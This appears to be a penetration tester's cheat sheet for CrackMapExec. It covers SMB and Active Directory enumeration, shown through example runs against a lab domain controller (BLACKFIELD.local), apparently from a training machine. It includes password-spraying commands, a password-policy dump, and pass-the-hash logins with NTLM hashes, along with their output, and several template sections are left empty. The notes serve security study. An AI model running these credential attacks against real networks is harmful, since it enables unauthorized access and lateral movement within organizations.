[CrackMapexec | SMB & AD Enumeration Simplified !](https://systemweakness.com/crackmapexec-smb-ad-enumeration-simplified-21e603927f44)

https://wiki.porchetta.industries/

https://ptestmethod.readthedocs.io/en/latest/cme.html

https://github.com/Porchetta-Industries/CrackMapExec/wiki/SMB-Command-Reference

# Template

### TL;DR
```
cme smb $ip -u users.txt -p sT333ve2
cme smb $ip -u users.txt -p sT333ve2 --continue-on-success
```

### Dump password policy with "--pass-pol"
cme smb $ip -u support -p '#00^BlackKnight' --pass-pol

### Pass-the-Hash (PtH) with "-H"
cme smb $ip -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
cme smb $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

```
--continue-on-success
                        continues authentication attempts even after successes
```


## CrackMapexec v5.4.0 (2023.1-3) doesn't work well. Update latest version manually
```
$ cat /etc/os-release 
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2023.3"
VERSION="2023.3"
...
```

### Installation

https://github.com/mpgn/CrackMapExec

https://wiki.porchetta.industries/getting-started/installation

https://wiki.porchetta.industries/getting-started/installation/installation-on-unix

```

```

### 
```

```

### Examples
### Dump password policy with "--pass-pol"
```
$ cme smb $ip -u support -p '#00^BlackKnight' --pass-pol
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Dumping password info for domain: BLACKFIELD
SMB         10.10.10.192    445    DC01             Minimum password length: 7                                                                                         
SMB         10.10.10.192    445    DC01             Password history length: 24                                                                                        
SMB         10.10.10.192    445    DC01             Maximum password age: 41 days 23 hours 53 minutes                                                                  
SMB         10.10.10.192    445    DC01                                                                                                                                
SMB         10.10.10.192    445    DC01             Password Complexity Flags: 000001                                                                                  
SMB         10.10.10.192    445    DC01                 Domain Refuse Password Change: 0                                                                               
SMB         10.10.10.192    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.10.192    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.10.192    445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.10.192    445    DC01                 Domain Password Complex: 1
SMB         10.10.10.192    445    DC01             
SMB         10.10.10.192    445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.10.10.192    445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.192    445    DC01             Locked Account Duration: 30 minutes 
SMB         10.10.10.192    445    DC01             Account Lockout Threshold: None
SMB         10.10.10.192    445    DC01             Forced Log off Time: Not Set
```

### Pass-the-Hash (PtH) with "-H" ; STATUS_LOGON_FAILURE
```
$ cme smb $ip -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
```

### Pass-the-Hash (PtH) with "-H" ; Successful
```
$ cme smb $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

### 
```

```

### 
```

```

### 
```

```